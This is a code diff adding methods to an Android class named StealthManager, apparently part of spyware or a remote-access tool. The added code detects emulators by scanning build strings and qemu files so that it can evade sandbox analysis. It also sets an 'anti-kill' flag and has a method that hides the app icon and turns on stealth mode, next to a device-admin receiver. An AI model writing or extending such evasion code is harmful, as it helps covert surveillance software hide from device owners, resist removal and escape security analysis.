@@ -279,6 +279,125 @@ public class StealthManager {
     }
 
     /**
+     * Anti-Emulator Detection
+     * Returns true if running on emulator
+     */
+    public boolean isEmulator() {
+        try {
+            String[] phoneInfo = {
+                android.os.Build.MODEL,
+                android.os.Build.MANUFACTURER,
+                android.os.Build.BRAND,
+                android.os.Build.DEVICE,
+                android.os.Build.PRODUCT,
+                android.os.Build.HARDWARE
+            };
+            
+            String[] emulatorStrings = {
+                "goldfish", "ranchu", "sdk", "emulator", "generic",
+                "google_sdk", "sdk_x86", "x86", "qemu"
+            };
+            
+            for (String info : phoneInfo) {
+                if (info != null) {
+                    info = info.toLowerCase();
+                    for (String emulator : emulatorStrings) {
+                        if (info.contains(emulator)) {
+                            return true;
+                        }
+                    }
+                }
+            }
+            
+            // Check for emulator-specific files
+            String[] files = {
+                "/dev/socket/qemud",
+                "/dev/qemu_pipe",
+                "/system/lib/libc_malloc_debug_qemu.so",
+                "/sys/qemu_trace",
+                "/system/bin/qemu-props"
+            };
+            
+            for (String file : files) {
+                java.io.File f = new java.io.File(file);
+                if (f.exists()) {
+                    return true;
+                }
+            }
+            
+            // Check for small screen size (emulator usually has small screen)
+            if (android.os.Build.MANUFACTURER.equals("unknown")) {
+                return true;
+            }
+            
+        } catch (Exception e) {
+            // Ignore
+        }
+        return false;
+    }
+    
+    /**
+     * Anti-Kill Protection - Restart service if killed
+     */
+    public void enableAntiKill(Context context) {
+        try {
+            // Save flag to enable auto-start
+            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+                .edit()
+                .putBoolean("anti_kill_enabled", true)
+                .apply();
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    /**
+     * Check if anti-kill is enabled
+     */
+    public boolean isAntiKillEnabled() {
+        return context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+            .getBoolean("anti_kill_enabled", false);
+    }
+    
+    /**
+     * Enable all stealth features at once
+     */
+    public JSONObject enableAllStealthFeatures() {
+        JSONObject result = new JSONObject();
+        
+        try {
+            // Hide app icon
+            hideAppIcon();
+            
+            // Enable stealth mode
+            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+                .edit()
+                .putBoolean(KEY_STEALTH_MODE, true)
+                .putBoolean("anti_kill_enabled", true)
+                .apply();
+            
+            result.put("success", true);
+            result.put("message", "All stealth features enabled");
+            result.put("features", new org.json.JSONArray()
+                .put("App icon hidden")
+                .put("Stealth mode enabled")
+                .put("Anti-kill enabled")
+                .put("Anti-emulator ready")
+            );
+            
+        } catch (Exception e) {
+            try {
+                result.put("success", false);
+                result.put("error", e.getMessage());
+            } catch (JSONException ex) {
+                ex.printStackTrace();
+            }
+        }
+        
+        return result;
+    }
+
+    /**
      * Device Admin Receiver Implementation
      */
     public static class DeviceAdminReceiverImpl extends DeviceAdminReceiver {
